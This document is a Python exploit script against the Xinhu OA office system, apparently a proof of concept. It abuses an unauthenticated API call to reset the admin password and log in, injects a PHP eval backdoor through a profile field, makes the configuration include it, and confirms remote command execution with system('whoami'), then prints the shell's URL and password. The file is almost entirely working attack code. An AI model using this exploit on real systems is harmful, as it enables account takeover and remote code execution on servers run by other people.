import hashlib
import requests
import base64
import json
from typing import Union


def strlook(data: Union[str, bytes], key: Union[str, bytes] = b'') -> str:
    if not data:
        return ''

    if isinstance(data, str):
        data_bytes = data.encode('latin1')
    else:
        data_bytes = data

    if isinstance(key, str):
        key_bytes = key.encode('latin1')
    else:
        key_bytes = key

    if not key_bytes:
        key_bytes = hashlib.md5(b'fapzjkutcqsynrewblmxvgihdo').hexdigest()

    data_len = len(data_bytes)
    key_len = len(key_bytes)

    times = (data_len // key_len) + 1
    key_repeated = (key_bytes * times)[:data_len]

    result_bytes = bytes(
        (data_bytes[i] + key_repeated[i]) & 0xff for i in range(data_len))

    b64 = base64.b64encode(result_bytes).decode('ascii')

    encoded = b64.replace('+', '!').replace('/', '.').replace('=', ':')
    return encoded


key = hashlib.md5(b'').hexdigest()
admin_cookie = {}
# proxy = {"http": "http://localhost:8083"}


def changePwd(target_url):
    url = target_url + "/index.php?d=task&m=reimplat|api&a=index&ajaxbool=false"
    data = {"msgtype": "editpass", "user": "admin", "pass": "666"}
    enc_data = strlook(json.dumps(data), key)
    requests.post(url, enc_data)
    if login(target_url):
        print("=== Change password success ===")
    else:
        print("=== Change password failed ===")


def login(target_url):
    global admin_cookie
    url = target_url + "/index.php?a=check&m=login&d=&ajaxbool=true"
    data = {
        "adminuser": "YWRtaW4:",
        "adminpass": "NjY2",
        "device": 1756867326309
    }
    s = requests.session()
    r = s.post(url, data)
    if (r.text.find("success") != -1):
        print("Login success")
        r = s.get(target_url)
        admin_cookie = s.cookies.get_dict()
        return True


def logout(target_url):
    global admin_cookie
    url = target_url + "/?m=login&a=exit"
    s = requests.session()
    r = s.get(url, cookies=admin_cookie, allow_redirects=False)
    if (r.status_code == 302):
        print("Logout success")
        admin_cookie = {}
    else:
        print("Logout failed")


def getshell(target_url):
    print("Start getshell...")
    inject_url = target_url + "/index.php?d=task&m=reimplat|api&a=index&ajaxbool=false"
    include_url = target_url + "/index.php?a=savecong&m=cog&d=system&ajaxbool=true"
    data = {
        "msgtype": "editmobile",
        "user": "admin",
        "mobile": "1',name='\neval($_POST[0]);//"
    }
    enc_data = strlook(json.dumps(data), key)
    r = requests.session().post(
        inject_url,
        enc_data,
        cookies=admin_cookie,
    )
    logout(target_url)
    login(target_url)
    include_data = {
        "apptheme": "",
        "apptitle": "信呼OA",
        "asynkey": "dcab015e50a170b09701d2c990ccea86",
        "asynsend": "0",
        "bcolorxiang": "",
        "companymode": "0",
        "db_drive": "mysqli",
        "debug": "1",
        "defstype": "1",
        "editpass": "1",
        "isshou": "0",
        "localurl": "",
        "loginyzm": "0",
        "mobile_show": "1",
        "officebj": "",
        "officebj_key": "",
        "officeyl": "0",
        "openkey": "1e1dc97c3016704b7a620881e5b43dd8",
        "outurl": "",
        "qqmapkey": "",
        "reim_show": "1",
        "reimtitle": "",
        "sqllog": "0",
        "title": "信呼协同办公系统",
        "url": "",
        "useropt": "",
        "xinhukey": ""
    }
    r = requests.post(
        include_url,
        include_data,
        cookies=admin_cookie,
    )
    if r.text.find("ok") != -1:
        print("include success")
    else:
        print("include failed")
        return
    payload = {"0": "system('whoami');"}
    shell = requests.post(
        target_url,
        data=payload,
        cookies=admin_cookie,
    )
    if shell.text.find("www") != -1:
        print("=== Getshell success ===")
        print("shell url:" + target_url)
        print("password:0")

target_url = ""

changePwd(target_url)
getshell(target_url)
